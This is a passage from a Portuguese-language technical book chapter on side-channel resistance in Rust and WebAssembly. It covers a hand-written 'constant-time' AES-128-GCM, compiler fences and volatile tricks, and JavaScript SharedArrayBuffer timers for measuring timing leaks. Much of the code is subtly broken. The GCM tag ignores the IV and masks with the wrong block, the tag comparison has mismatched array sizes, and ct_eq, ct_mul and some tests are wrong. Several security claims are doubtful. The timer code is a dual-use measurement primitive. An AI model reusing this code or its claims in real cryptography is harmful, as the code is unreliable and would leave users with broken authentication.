    round_keys
}

fn round_constants(round: usize) -> u8 {
    match round {
        1 => 0x01,
        2 => 0x02,
        3 => 0x04,
        4 => 0x08,
        5 => 0x10,
        6 => 0x20,
        7 => 0x40,
        8 => 0x80,
        9 => 0x1B,
        10 => 0x36,
        _ => 0x00,
    }
}

// AES encryption constante-time
pub fn ct_aes_encrypt(block: &[u8; 16], key: &[u8; 16]) -> [u8; 16] {
    let round_keys = ct_key_expansion(key);
    let mut state = *block;

    ct_add_round_key(&mut state, &round_keys[0]);

    for round in 1..10 {
        ct_aes_round(&mut state, &round_keys[round]);
    }

    // Último round (sem MixColumns)
    ct_sub_bytes(&mut state);
    ct_shift_rows(&mut state);
    ct_add_round_key(&mut state, &round_keys[10]);

    state
}

// GCM multiplication constante-time
fn ct_gcm_mul(x: &[u8; 16], h: &[u8; 16]) -> [u8; 16] {
    let mut z = [0u8; 16];
    let mut v = *x;

    for i in 0..128 {
        let byte_idx = i / 8;
        let bit_idx = 7 - (i % 8);

        let mask = ct_mask((h[byte_idx] >> bit_idx) & 1 == 1);

        // z ^= v if bit is set
        for j in 0..16 {
            z[j] ^= v[j] & mask;
        }

        // v >>= 1
        let mut carry = 0u8;
        for j in (0..16).rev() {
            let new_carry = v[j] & 1;
            v[j] = (v[j] >> 1) | (carry << 7);
            carry = new_carry;
        }

        // v ^= R if LSB was 1
        let r_mask = ct_mask(carry == 1);
        v[0] ^= 0xE1 & r_mask;
    }

    z
}

// GCTR constante-time
fn ct_gctr(
    key: &[u8; 16],
    icb: &[u8; 16],
    plaintext: &[u8],
) -> Vec<u8> {
    let n = plaintext.len();
    let mut ciphertext = vec![0u8; n];

    let mut cb = *icb;

    for i in (0..n).step_by(16) {
        let encrypted_cb = ct_aes_encrypt(&cb, key);

        let block_len = (n - i).min(16);
        for j in 0..block_len {
            ciphertext[i + j] = plaintext[i + j] ^ encrypted_cb[j];
        }

        // Increment counter
        cb = increment_counter(&cb);
    }

    ciphertext
}

fn increment_counter(counter: &[u8; 16]) -> [u8; 16] {
    let mut result = *counter;
    for i in (0..16).rev() {
        if result[i] < 255 {
            result[i] += 1;
            break;
        }
        result[i] = 0;
    }
    result
}

// GCM Auth tag constante-time
fn ct_gcm_tag(
    key: &[u8; 16],
    iv: &[u8],
    plaintext: &[u8],
    aad: &[u8],
) -> [u8; 16] {
    let h = ct_aes_encrypt(&[0u8; 16], key);

    // Calcular tag sobre AAD
    let mut tag = [0u8; 16];
    for i in (0..aad.len()).step_by(16) {
        let block_len = (aad.len() - i).min(16);
        let mut block = [0u8; 16];
        block[..block_len].copy_from_slice(&aad[i..i + block_len]);
        tag = ct_gcm_mul(&xor_blocks(&tag, &block), &h);
    }

    // Calcular tag sobre ciphertext
    for i in (0..plaintext.len()).step_by(16) {
        let block_len = (plaintext.len() - i).min(16);
        let mut block = [0u8; 16];
        block[..block_len].copy_from_slice(&plaintext[i..i + block_len]);
        tag = ct_gcm_mul(&xor_blocks(&tag, &block), &h);
    }

    // Adicionar comprimentos
    let mut len_block = [0u8; 16];
    len_block[0..8].copy_from_slice(&(aad.len() as u64 * 8).to_be_bytes());
    len_block[8..16].copy_from_slice(&(plaintext.len() as u64 * 8).to_be_bytes());
    tag = ct_gcm_mul(&xor_blocks(&tag, &len_block), &h);

    // Criptografar counter para tag final
    let encrypted_counter = ct_aes_encrypt(&[0u8; 16], key);
    xor_blocks(&tag, &encrypted_counter)
}

fn xor_blocks(a: &[u8; 16], b: &[u8; 16]) -> [u8; 16] {
    let mut result = [0u8; 16];
    for i in 0..16 {
        result[i] = a[i] ^ b[i];
    }
    result
}

// API principal: AES-128-GCM encrypt constante-time
pub fn ct_aes_128_gcm_encrypt(
    key: &[u8; 16],
    iv: &[u8],
    plaintext: &[u8],
    aad: &[u8],
) -> (Vec<u8>, [u8; 16]) {
    // Derivar J0
    let mut j0 = [0u8; 16];
    if iv.len() == 12 {
        j0[..12].copy_from_slice(iv);
        j0[15] = 1;
    } else {
        j0 = ct_gcm_tag(key, &[], &[], iv);
    }

    // Criptografar plaintext
    let mut icb = j0;
    icb[15] += 1;
    let ciphertext = ct_gctr(key, &icb, plaintext);

    // Calcular auth tag
    let tag = ct_gcm_tag(key, iv, &ciphertext, aad);

    (ciphertext, tag)
}

// API principal: AES-128-GCM decrypt constante-time
pub fn ct_aes_128_gcm_decrypt(
    key: &[u8; 16],
    iv: &[u8],
    ciphertext: &[u8],
    aad: &[u8],
    tag: &[u8; 16],
) -> Result<Vec<u8>, ()> {
    // Derivar J0
    let mut j0 = [0u8; 16];
    if iv.len() == 12 {
        j0[..12].copy_from_slice(iv);
        j0[15] = 1;
    } else {
        j0 = ct_gcm_tag(key, &[], &[], iv);
    }

    // Verificar auth tag primeiro
    let expected_tag = ct_gcm_tag(key, iv, ciphertext, aad);
    if !ct_compare_hashes(tag, &expected_tag) {
        return Err(());
    }

    // Descriptografar
    let mut icb = j0;
    icb[15] += 1;
    let plaintext = ct_gctr(key, &icb, ciphertext);

    Ok(plaintext)
}

fn ct_compare_hashes(a: &[u8; 32], b: &[u8; 32]) -> bool {
    let mut diff = 0u8;
    for i in 0..32 {
        diff |= a[i] ^ b[i];
    }
    diff == 0
}

#[cfg(test)]
mod ct_aes_gcm_tests {
    use super::*;

    #[test]
    fn test_ct_aes_encrypt() {
        let key = [0x2b; 16];
        let plaintext = [0x48; 16];
        let ciphertext = ct_aes_encrypt(&plaintext, &key);

        // Verificar que a criptografia funciona
        assert_ne!(plaintext, ciphertext);

        // Verificar que é determinística
        let ciphertext2 = ct_aes_encrypt(&plaintext, &key);
        assert_eq!(ciphertext, ciphertext2);
    }

    #[test]
    fn test_ct_gcm_encrypt_decrypt() {
        let key = [0x42; 16];
        let iv = [0x24; 12];
        let plaintext = b"Hello, World!";
        let aad = b"Additional data";

        let (ciphertext, tag) = ct_aes_128_gcm_encrypt(&key, &iv, plaintext, aad);

        let decrypted = ct_aes_128_gcm_decrypt(&key, &iv, &ciphertext, aad, &tag);
        assert!(decrypted.is_ok());
        assert_eq!(decrypted.unwrap(), plaintext);
    }
}
```

## 10.8 Intrinsics do Compilador para Resistência a Side-Channel

Compiladores oferecem various intrinsics e construções que podem ser usadas para implementar resistência a side-channels em código Wasm.

### 10.8.1 Intrinsics para Instruções de Barreira

```rust
// Intrinsics do compilador para barreiras de memória

// 1. Compiler Fence
// Impede que o compilador reordenar operações
pub fn compiler_fence_example() {
    use std::sync::atomic::{compiler_fence, Ordering};

    // Operações antes do fence
    let a = 1;
    let b = 2;

    // Fence: compilador não pode reordenar operações antes/depois
    compiler_fence(Ordering::SeqCst);

    // Operações depois do fence
    let c = a + b;
    let d = c * 3;

    // Garantir que as operações não sejam otimizadas
    std::hint::black_box((a, b, c, d));
}

// 2. Atomic Fence (mais forte que compiler fence)
pub fn atomic_fence_example() {
    use std::sync::atomic::{fence, Ordering};

    // Fence atômico: impede reordenamento em runtime
    fence(Ordering::SeqCst);

    // Isso é mais forte que compiler_fence porque
    // também impede reordenamento pelo hardware
}

// 3. read_volatile / write_volatile
pub fn volatile_example() {
    let mut value = 0u32;
    let ptr = &mut value as *mut u32;

    // Volatile read: compilador não pode otimizar
    unsafe {
        let read = std::ptr::read_volatile(ptr);
        std::hint::black_box(read);
    }

    // Volatile write: compilador não pode otimizar
    unsafe {
        std::ptr::write_volatile(ptr, 42);
    }
}

// 4. black_box
pub fn black_box_example() {
    let secret = 42;

    // black_box impede que o compilador otimize a expressão
    let result = std::hint::black_box(secret);

    // Isso é útil para:
    // - Impedir que valores secretos sejam otimizados
    // - Impedir que branches sejam eliminados
    // - Impedir que acessos a memória sejam reordenados
    std::hint::black_box(result);
}

// 5. fences específicas para side-channels
pub fn side_channel_barriers() {
    use std::sync::atomic::{compiler_fence, fence, Ordering};

    // Barrier antes de operação sensível
    compiler_fence(Ordering::SeqCst);

    // Operação sensível
    let _ = 42;

    // Barrier após operação sensível
    compiler_fence(Ordering::SeqCst);

    // Fence mais forte se necessário
    fence(Ordering::SeqCst);
}

// Macro para aplicar barreiras automaticamente
macro_rules! ct_barrier {
    () => {{
        use std::sync::atomic::{compiler_fence, Ordering};
        compiler_fence(Ordering::SeqCst);
    }};
}

macro_rules! ct_block {
    ($body:block) => {{
        ct_barrier!();
        let result = $body;
        ct_barrier!();
        result
    }};
}

#[cfg(test)]
mod barrier_tests {
    use super::*;

    #[test]
    fn test_barriers() {
        let result = ct_block!({
            let a = 42;
            let b = 58;
            a + b
        });

        assert_eq!(result, 100);
    }
}
```

### 10.8.2 Intrinsics Atômicas LLVM

```rust
// Intrinsics atômicas LLVM para Wasm

// Em Wasm, operações atômicas são suportadas via
// a feature flag +atomics

// 1. Atomic Load
pub fn atomic_load_example() {
    use std::sync::atomic::{AtomicU32, Ordering};

    static COUNTER: AtomicU32 = AtomicU32::new(0);

    // Load atômico
    let value = COUNTER.load(Ordering::SeqCst);

    // Isso gera uma instrução atômica em Wasm
    // que é mais segura contra side-channels porque
    // é uma operação indivisível
    std::hint::black_box(value);
}

// 2. Atomic Store
pub fn atomic_store_example() {
    use std::sync::atomic::{AtomicU32, Ordering};

    static FLAG: AtomicU32 = AtomicU32::new(0);

    // Store atômico
    FLAG.store(42, Ordering::SeqCst);

    // Isso gera uma instrução atômica em Wasm
    // que garante visibilidade imediata em todas as threads
}

// 3. Atomic Compare-and-Swap (CAS)
pub fn atomic_cas_example() {
    use std::sync::atomic::{AtomicU32, Ordering};

    static VALUE: AtomicU32 = AtomicU32::new(0);

    // CAS atômico: compara e troca se igual
    let old = VALUE.compare_exchange(
        0,      // valor esperado
        42,     // novo valor
        Ordering::SeqCst,
        Ordering::SeqCst,
    );

    match old {
        Ok(v) => println!("CAS bem-sucedido: {}", v),
        Err(v) => println!("CAS falhou: {}", v),
    }
}

// 4. Atomic Fetch-and-Add
pub fn atomic_fetch_add_example() {
    use std::sync::atomic::{AtomicU64, Ordering};

    static COUNTER: AtomicU64 = AtomicU64::new(0);

    // Fetch-and-add atômico
    let old_value = COUNTER.fetch_add(1, Ordering::SeqCst);

    // Retorna o valor anterior
    println!("Valor anterior: {}", old_value);
}

// 5. Atomic Fence
pub fn atomic_fence_llvm() {
    use std::sync::atomic::{fence, Ordering};

    // Fence atômico via LLVM
    fence(Ordering::SeqCst);

    // Isso gera uma instrução de barreira no código nativo
    // e uma barreira atômica em Wasm
}

// 6. Memory Fence para Wasm
pub fn wasm_memory_fence() {
    // Em Wasm com atomics, memory fences são suportados
    use std::sync::atomic::{compiler_fence, Ordering};

    // Compiler fence (barreira de compilação)
    compiler_fence(Ordering::SeqCst);

    // Isso impede que o compilador reordenar operações
    // mas NÃO impede reordenamento pelo hardware
    // Para barreiras de hardware, usar atomic fences
}

// 7. Usando intrinsics para side-channel resistance
pub fn side_channel_resistant_atomic() {
    use std::sync::atomic::{AtomicU8, Ordering};

    // Valor secreto em memória atômica
    static SECRET: AtomicU8 = AtomicU8::new(0);

    // Ler valor secreto de forma segura
    let secret = SECRET.load(Ordering::SeqCst);

    // Usar o valor com barreiras
    compiler_fence(Ordering::SeqCst);

    // Processar secret
    let result = process_secret(secret);

    compiler_fence(Ordering::SeqCst);

    std::hint::black_box(result);
}

fn process_secret(secret: u8) -> u8 {
    // Processamento em tempo constante
    let mut result = 0u8;
    for i in 0..8 {
        let bit = (secret >> i) & 1;
        result ^= bit;
    }
    result
}
```

### 10.8.3 Dicas Específicas para Wasm

```rust
// Dicas de compilação específicas para Wasm

// 1. Configurar target features
// Em Cargo.toml:
// [target.wasm32-unknown-unknown]
// rustflags = ["-C", "target-feature=+atomics,+bulk-memory,+mutable-globals"]

// 2. Usar cfg para código específico de Wasm
#[cfg(target_arch = "wasm32")]
pub fn wasm_specific_barrier() {
    // Em Wasm, usar intrinsics específicas
    // Isso gera código otimizado para Wasm
}

#[cfg(not(target_arch = "wasm32"))]
pub fn native_specific_barrier() {
    // Em nativo, usar LFENCE ou similar
}

// 3. Inline assembly para Wasm
#[cfg(target_arch = "wasm32")]
pub fn wasm_inline_asm() {
    unsafe {
        // Em Wasm, podemos usar inline assembly
        // para instruções específicas
        std::arch::asm!("nop", options(nomem, nostack));
    }
}

// 4. Usar #[inline(never)] para funções sensíveis
#[inline(never)]
pub fn sensitive_function(data: &[u8], key: u8) -> Vec<u8> {
    // Função que processa dados sensíveis
    // #[inline(never)] impede inlining que pode criar gadgets Spectre

    let mut result = Vec::with_capacity(data.len());
    for &byte in data {
        result.push(byte ^ key);
    }
    result
}

// 5. Usar #[cold] para branches de erro
pub fn process_data(data: &[u8], index: usize) -> Option<u8> {
    if index >= data.len() {
        return None; // #[cold] branch
    }

    Some(data[index])
}

// 6. Configurações de build específicas para Wasm
// wasm-pack build --release --target web -- --cfg 'feature="wasm-simd"'

// 7. Usar features condicionais
#[cfg(feature = "wasm-simd")]
pub fn wasm_simd_operation() {
    // Operações SIMD para Wasm
    // SIMD pode ser mais resistente a side-channels
    // porque processa múltiplos dados simultaneamente
}

// 8. Evitar otimizações perigosas
pub fn avoid_dangerous_optimizations() {
    // Usar black_box para impedir otimização
    let secret = std::hint::black_box(42);

    // Usar read_volatile para leituras de memória
    let ptr = &secret as *const i32;
    let value = unsafe { std::ptr::read_volatile(ptr) };

    // Usar compiler_fence para barreiras
    std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);

    std::hint::black_box(value);
}
```

### 10.8.4 Prevenindo Otimizações do Compilador Que Quebram Constant-Time

```rust
// Técnicas para prevenir otimizações que quebram constant-time

// 1. Usar volatile para leituras críticas
pub fn volatile_prevents_optimization() {
    let secret = 42u32;
    let ptr = &secret as *const u32;

    // read_volatile impede que o compilador otimize a leitura
    let value = unsafe { std::ptr::read_volatile(ptr) };

    // Isso é importante porque o compilador pode:
    // - Remover leituras que parecem não ter efeito
    // - Reordenar leituras para melhor performance
    // - Substituir leituras por valores cached

    std::hint::black_box(value);
}

// 2. Usar black_box para valores intermediários
pub fn black_box_prevents_optimization() {
    let a = 1u32;
    let b = 2u32;

    // black_box impede otimização da expressão
    let result = std::hint::black_box(a + b);

    // Sem black_box, o compilador pode:
    // - Calcular o resultado em compile-time
    // - Eliminar código morto
    // - Reordenar operações

    std::hint::black_box(result);
}

// 3. Usar loop com iterações fixas
pub fn fixed_iterations_prevents_optimization() {
    let secret = 42u8;
    let mut result = 0u8;

    // SEMPRE itera 256 vezes (máximo valor de u8)
    for i in 0..256u16 {
        // Usar arithmetic em vez de branch
        let mask = if i == secret as u16 { 0xFF } else { 0x00 };
        result ^= (i as u8) & (mask as u8);
    }

    // O compilador não pode otimizar o loop porque
    // o número de iterações é fixo

    std::hint::black_box(result);
}

// 4. Usar operações aritméticas em vez de branches
pub fn arithmetic_instead_of_branch() {
    let secret = 42u8;
    let table = [0u8; 256];

    let mut result = 0u8;

    // Em vez de:
    // if secret < 128 { result = table[secret]; }
    //
    // Usar:
    let index = secret as usize;
    let mask = (!0u8).wrapping_neg() & ((secret ^ 128) >> 7);
    result = table[index & (mask as usize)];

    // Isso é mais resistente a otimizações porque
    // não há branch para o compilador otimizar

    std::hint::black_box(result);
}

// 5. Usar operações bitwise para conditional moves
pub fn bitwise_conditional() {
    let condition = true;
    let true_value = 42u8;
    let false_value = 0u8;

    // Em vez de:
    // let result = if condition { true_value } else { false_value };
    //
    // Usar:
    let mask = (condition as u8).wrapping_neg(); // 0xFF se true, 0x00 se false
    let result = (true_value & mask) | (false_value & !mask);

    // Isso é mais resistente a side-channels porque
    // não gera branch no código nativo

    std::hint::black_box(result);
}

// 6. Usar operações de seleção constante-time
pub fn ct_select(condition: bool, a: u8, b: u8) -> u8 {
    // Seleção constante-time
    let mask = (condition as u8).wrapping_neg();
    (a & mask) | (b & !mask)
}

// 7. Usar operações de comparação constante-time
pub fn ct_eq(a: u8, b: u8) -> u8 {
    // Comparação constante-time
    let diff = a ^ b;
    // Se diff == 0, retorna 0xFF, senão 0x00
    (!diff | diff.wrapping_neg()) >> 7
}

// 8. Usar operações de multiplicação constante-time
pub fn ct_mul(a: u8, b: u8) -> u8 {
    // Multiplicação constante-time
    // Usar shift-and-add em vez de multiplicação nativa
    let mut result = 0u8;
    let mut a = a;
    let mut b = b;

    for _ in 0..8 {
        let mask = (b & 1).wrapping_neg();
        result = result.wrapping_add(a & mask);
        a = a.rotate_left(1);
        b >>= 1;
    }

    result
}

#[cfg(test)]
mod optimization_prevention_tests {
    use super::*;

    #[test]
    fn test_ct_select() {
        assert_eq!(ct_select(true, 42, 0), 42);
        assert_eq!(ct_select(false, 42, 0), 0);
    }

    #[test]
    fn test_ct_eq() {
        assert_eq!(ct_eq(42, 42), 0xFF);
        assert_eq!(ct_eq(42, 43), 0x00);
    }

    #[test]
    fn test_ct_mul() {
        assert_eq!(ct_mul(3, 7), 21);
        assert_eq!(ct_mul(0, 255), 0);
    }
}
```

### 10.8.5 O Qualificador volatile no Contexto Wasm

```rust
// Uso do qualificador volatile em Wasm

// Em C/C++, volatile impede que o compilador otimize
// leituras e escritas. Em Rust, usamos read_volatile/write_volatile

// 1. Leitura volatile
pub fn volatile_read_example() {
    let value = 42u32;
    let ptr = &value as *const u32;

    // read_volatile garante que a leitura realmente acontece
    let read_value = unsafe { std::ptr::read_volatile(ptr) };

    // Isso é importante porque:
    // - O compilador pode remover leituras "inúteis"
    // - Em código de side-channel, queremos garantir que
    //   leituras de memória realmente ocorram

    std::hint::black_box(read_value);
}

// 2. Escrita volatile
pub fn volatile_write_example() {
    let mut value = 0u32;
    let ptr = &mut value as *mut u32;

    // write_volatile garante que a escrita realmente acontece
    unsafe {
        std::ptr::write_volatile(ptr, 42);
    }

    // Isso é importante porque:
    // - O compilador pode remover escritas "inúteis"
    // - Em código de side-channel, queremos garantir que
    //   escritas de memória realmente ocorram
}

// 3. Volatile em loops
pub fn volatile_loop_example() {
    let mut counter = 0u32;
    let ptr = &mut counter as *mut u32;

    // Sem volatile, o compilador pode:
    // - Remover o loop inteiro
    // - Otimizar para um loop mais eficiente
    // - Reordenar operações dentro do loop

    // Com volatile, cada iteração realmente acessa a memória
    for _ in 0..100 {
        unsafe {
            let current = std::ptr::read_volatile(ptr);
            std::ptr::write_volatile(ptr, current + 1);
        }
    }
}

// 4. Volatile para impedir otimização de código sensível
pub fn volatile_sensitive_code() {
    let secret_data = vec![1, 2, 3, 4, 5];
    let mut result = 0u8;

    // Sem volatile, o compilador pode:
    // - Calcular o resultado em compile-time
    // - Eliminar código morto
    // - Reordenar operações

    // Com volatile, cada operação realmente acontece em runtime
    for &byte in &secret_data {
        // Volatile read para garantir que o byte é realmente lido
        let read_byte = unsafe { std::ptr::read_volatile(&byte as *const u8) };
        result ^= read_byte;
    }

    // Volatile write para garantir que o resultado é realmente escrito
    let result_ptr = &mut result as *mut u8;
    unsafe {
        std::ptr::write_volatile(result_ptr, result);
    }

    std::hint::black_box(result);
}

// 5. Comparação: com e sem volatile
pub fn comparison_with_without_volatile() {
    let data = vec![0u8; 1024];

    // SEM volatile (pode ser otimizado)
    let _sum_without: u64 = data.iter().sum();

    // COM volatile (não pode ser otimizado)
    let mut sum_with = 0u64;
    for &byte in &data {
        let read_byte = unsafe { std::ptr::read_volatile(&byte as *const u8) };
        sum_with = sum_with.wrapping_add(read_byte as u64);
    }

    // Em debug, ambos produzem o mesmo resultado
    // Em release, o compilador pode otimizar a versão sem volatile
    std::hint::black_box(sum_with);
}
```

### 10.8.6 Assembly Inline para Barreiras Wasm

```rust
// Assembly inline para barreiras em Wasm

// Em Wasm, não temos acesso direto a instruções de hardware
// Mas podemos usar intrinsics e operações atômicas

// 1. Compiler fence via operação atômica
pub fn wasm_compiler_fence() {
    use std::sync::atomic::{compiler_fence, Ordering};

    // Isso gera uma barreira de compilação em Wasm
    compiler_fence(Ordering::SeqCst);
}

// 2. Memory fence via operações atômicas
pub fn wasm_memory_fence() {
    use std::sync::atomic::{fence, Ordering};

    // Isso gera uma barreira de memória em Wasm
    // quando a feature +atomics está habilitada
    fence(Ordering::SeqCst);
}

// 3. Usando atomics para barreiras
pub fn wasm_atomic_barrier() {
    use std::sync::atomic::{AtomicU32, Ordering};

    static BARRIER: AtomicU32 = AtomicU32::new(0);

    // Store atômico cria uma barreira de memória
    BARRIER.store(1, Ordering::SeqCst);

    // Load atômico cria uma barreira de memória
    let _ = BARRIER.load(Ordering::SeqCst);
}

// 4. Usando compare_exchange para barreiras
pub fn wasm_cas_barrier() {
    use std::sync::atomic::{AtomicU32, Ordering};

    static BARRIER: AtomicU32 = AtomicU32::new(0);

    // compare_exchange cria uma barreira de memória
    let _ = BARRIER.compare_exchange(
        0,
        1,
        Ordering::SeqCst,
        Ordering::SeqCst,
    );
}

// 5. Usando fetch_add para barreiras
pub fn wasm_fetch_add_barrier() {
    use std::sync::atomic::{AtomicU64, Ordering};

    static COUNTER: AtomicU64 = AtomicU64::new(0);

    // fetch_add cria uma barreira de memória
    let _ = COUNTER.fetch_add(1, Ordering::SeqCst);
}

// 6. Macro para barreiras Wasm
macro_rules! wasm_barrier {
    () => {{
        use std::sync::atomic::{compiler_fence, Ordering};
        compiler_fence(Ordering::SeqCst);
    }};
}

macro_rules! wasm_memory_barrier {
    () => {{
        use std::sync::atomic::{fence, Ordering};
        fence(Ordering::SeqCst);
    }};
}

// 7. Exemplo completo de barreira para side-channel
pub fn side_channel_barrier_example() {
    let secret = 42u8;

    // Barreira antes de ler dado secreto
    wasm_barrier!();

    // Ler dado secreto
    let value = unsafe { std::ptr::read_volatile(&secret as *const u8) };

    // Barreira após ler dado secreto
    wasm_barrier!();

    // Processar dado
    let result = process(value);

    // Barreira após processamento
    wasm_barrier!();

    std::hint::black_box(result);
}

fn process(value: u8) -> u8 {
    // Processamento em tempo constante
    value ^ 0xFF
}

#[cfg(test)]
mod wasm_barrier_tests {
    use super::*;

    #[test]
    fn test_wasm_barriers() {
        let result = side_channel_barrier_example();
        assert_eq!(result, 42 ^ 0xFF);
    }
}
```

## 10.9 Medindo Variações de Timing

A medição precisa de variações de timing é essencial para detectar e quantificar side-channel leaks em Wasm. Esta seção apresenta técnicas e ferramentas para medição de timing de alta resolução.

### 10.9.1 Temporizadores de Alta Resolução em Wasm

```javascript
// Temporizadores de alta resolução para Wasm

// 1. performance.now()
// Disponível em todos os navegadores modernos
// Resolução: ~1-5 microssegundos (depende do navegador)
function getHighResTimestamp() {
    return performance.now();
}

// 2. SharedArrayBuffer-based timer
// Mais preciso, mas requer Cross-Origin Isolation
function createSharedArrayBufferTimer() {
    if (!self.crossOriginIsolated) {
        throw new Error('Cross-Origin Isolation necessário');
    }

    const sab = new SharedArrayBuffer(1024);
    const buffer = new Int32Array(sab);

    // Criar Web Worker para timer
    const workerCode = `
        const sab = new SharedArrayBuffer(1024);
        const buffer = new Int32Array(sab);
        let running = true;

        self.onmessage = function(e) {
            if (e.data === 'start') {
                while (running) {
                    Atomics.add(buffer, 0, 1);
                }
            } else if (e.data === 'stop') {
                running = false;
            }
        };
    `;

    const blob = new Blob([workerCode], { type: 'application/javascript' });
    const url = URL.createObjectURL(blob);
    const worker = new Worker(url);

    return {
        start() {
            worker.postMessage('start');
        },
        stop() {
            worker.postMessage('stop');
        },
        read() {
            return Atomics.load(buffer, 0);
        }
    };
}

// 3. High-resolution timer com calibração
function createCalibratedTimer() {
    const timer = createSharedArrayBufferTimer();
    timer.start();

    // Calibrar o timer
    const calibrationRuns = 1000;
    const times = [];

    for (let i = 0; i < calibrationRuns; i++) {
        const start = timer.read();
        // Operação de referência
        const _ = Math.random();
        const end = timer.read();
        times.push(end - start);
    }

    // Calcular overhead médio
    const avgOverhead = times.reduce((a, b) => a + b, 0) / times.length;

    return {
        read() {
            return timer.read();
        },
        measure(fn) {
            const start = timer.read();
            fn();
            const end = timer.read();
            return end - start - avgOverhead;
        },
        stop() {
            timer.stop();
        }
    };
}

// 4. Timer para Wasm via imports
function createWasmTimer(wasmInstance) {
    const sab = new SharedArrayBuffer(1024);
    const buffer = new Int32Array(sab);

    // Configurar imports para o módulo Wasm
    const imports = {
        env: {
            timer_buffer: sab,
        }
    };

    return {
        getBuffer() {
            return buffer;
        },
        read() {
            return Atomics.load(buffer, 0);
        }
    };
}
```

### 10.9.2 Precisão e Resolução de performance.now()

```javascript
// Análise de precisão e resolução de performance.now()

// 1. Medir resolução do timer
function measureTimerResolution() {
    const samples = [];
    const numSamples = 10000;

    for (let i = 0; i < numSamples; i++) {
        const t1 = performance.now();
        const t2 = performance.now();
        samples.push(t2 - t1);
    }

    // Calcular estatísticas
    const min = Math.min(...samples);
    const max = Math.max(...samples);
    const avg = samples.reduce((a, b) => a + b, 0) / samples.length;

    // Calcular resolução (menor valor não-zero)
    const uniqueValues = [...new Set(samples)].sort((a, b) => a - b);
    const resolution = uniqueValues[1] || uniqueValues[0]; // Segundo menor valor

    return {
        min,
        max,
        avg,
        resolution,
        uniqueValues: uniqueValues.length
    };
}

// 2. Calibrar timer para medições de side-channel
function calibrateTimer() {
    const resolution = measureTimerResolution();

    // Número de iterações para obter medição confiável
    const iterations = Math.ceil(1000 / resolution.resolution);

    // Medir overhead de medição
    const times = [];
    for (let i = 0; i < iterations; i++) {
        const start = performance.now();
        const end = performance.now();
        times.push(end - start);
    }

    const avgOverhead = times.reduce((a, b) => a + b, 0) / times.length;

    return {
        resolution: resolution.resolution,
        recommendedIterations: iterations,
        avgOverhead,
        confidence: calculateConfidence(times)
    };
}

// 3. Calcular confiança da medição
function calculateConfidence(samples) {
    const n = samples.length;
    const mean = samples.reduce((a, b) => a + b, 0) / n;
    const variance = samples.reduce((sum, x) => sum + Math.pow(x - mean, 2), 0) / n;
    const stdDev = Math.sqrt(variance);

    // Intervalo de confiança de 95%
    const marginOfError = 1.96 * (stdDev / Math.sqrt(n));

    return {
        mean,
        stdDev,
        marginOfError,
        lowerBound: mean - marginOfError,
        upperBound: mean + marginOfError
    };
}

// 4. Medir variação de timing de operação
function measureTimingVariation(operation, iterations = 10000) {
    const times = [];

    for (let i = 0; i < iterations; i++) {
        const start = performance.now();
        operation();
        const end = performance.now();
        times.push(end - start);
    }

    const stats = calculateConfidence(times);

    return {
        ...stats,
        min: Math.min(...times),
        max: Math.max(...times),
        median: times.sort((a, b) => a - b)[Math.floor(times.length / 2)],
        iterations
    };
}

// 5. Detectar timing leak
function detectTimingLeak(operation1, operation2, threshold = 0.001) {
    const stats1 = measureTimingVariation(operation1);
    const stats2 = measureTimingVariation(operation2);

    // Teste t para comparar as duas distribuições
    const tStatistic = calculateTStatistic(stats1, stats2);

    // Se o t-estatístico for significativo, há um timing leak
    const isLeak = Math.abs(tStatistic) > 2.576; // 99% de confiança

    return {
        isLeak,
        tStatistic,
        stats1,
        stats2,
        difference: Math.abs(stats1.mean - stats2.mean)
    };
}

// 6. Calcular t-estatístico
function calculateTStatistic(stats1, stats2) {
    const n1 = stats1.iterations || 1000;
    const n2 = stats2.iterations || 1000;

    const pooledVariance = (
        (n1 - 1) * Math.pow(stats1.stdDev, 2) +
        (n2 - 1) * Math.pow(stats2.stdDev, 2)
    ) / (n1 + n2 - 2);

    const standardError = Math.sqrt(
        pooledVariance * (1/n1 + 1/n2)
    );

    return (stats1.mean - stats2.mean) / standardError;
}
```

### 10.9.3 Temporizadores Baseados em SharedArrayBuffer

```javascript
// Temporizadores baseados em SharedArrayBuffer

// 1. Timer de alta resolução usando SharedArrayBuffer
class HighResTimer {
    constructor() {
        if (!self.crossOriginIsolated) {
            throw new Error('Cross-Origin Isolation necessário para SharedArrayBuffer');
        }

        this.sab = new SharedArrayBuffer(1024);
        this.buffer = new Int32Array(this.sab);
        this.worker = null;
        this.running = false;
    }

    start() {
        const workerCode = `
            let buffer;
            let running = true;

            self.onmessage = function(e) {
                if (e.data.type === 'init') {
                    buffer = new Int32Array(e.data.sab);
                } else if (e.data.type === 'start') {
                    running = true;
                    while (running) {
                        Atomics.add(buffer, 0, 1);
                    }
                } else if (e.data.type === 'stop') {
                    running = false;
                }
            };
        `;

        const blob = new Blob([workerCode], { type: 'application/javascript' });
        const url = URL.createObjectURL(blob);
        this.worker = new Worker(url);

        this.worker.postMessage({
            type: 'init',
            sab: this.sab
        });

        this.worker.postMessage({ type: 'start' });
        this.running = true;
    }

    stop() {
        if (this.worker) {
            this.worker.postMessage({ type: 'stop' });
            this.worker.terminate();
            this.worker = null;
        }
        this.running = false;
    }

    read() {
        return Atomics.load(this.buffer, 0);
    }

    reset() {
        Atomics.store(this.buffer, 0, 0);
    }
}

// 2. Timer calibrado com SharedArrayBuffer
class CalibratedTimer {
    constructor() {
        this.timer = new HighResTimer();
        this.resolution = 0;
        this.overhead = 0;
        this.calibrated = false;
    }

    async calibrate() {
        this.timer.start();

        // Medir resolução
        const resolutionSamples = [];
        for (let i = 0; i < 1000; i++) {
            const t1 = this.timer.read();
            const t2 = this.timer.read();
            resolutionSamples.push(t2 - t1);
        }

        this.resolution = Math.min(...resolutionSamples.filter(x => x > 0));

        // Medir overhead
        const overheadSamples = [];
        for (let i = 0; i < 1000; i++) {
            const start = this.timer.read();
            const end = this.timer.read();
            overheadSamples.push(end - start);
        }

        this.overhead = overheadSamples.reduce((a, b) => a + b, 0) / overheadSamples.length;

        this.calibrated = true;
        this.timer.stop();

        return {
            resolution: this.resolution,
            overhead: this.overhead
        };
    }

    measure(operation) {
        if (!this.calibrated) {
            throw new Error('Timer must be calibrated first');
        }

        this.timer.reset();
        this.timer.start();

        const start = this.timer.read();
        operation();
        const end = this.timer.read();

        this.timer.stop();

        return end - start - this.overhead;
    }
}

// 3. Timer para medição de side-channels
class SideChannelTimer {
    constructor() {
        this.timer = new CalibratedTimer();
        this.measurements = [];
    }

    async initialize() {
        await this.timer.calibrate();
    }

    // Medir timing de uma operação
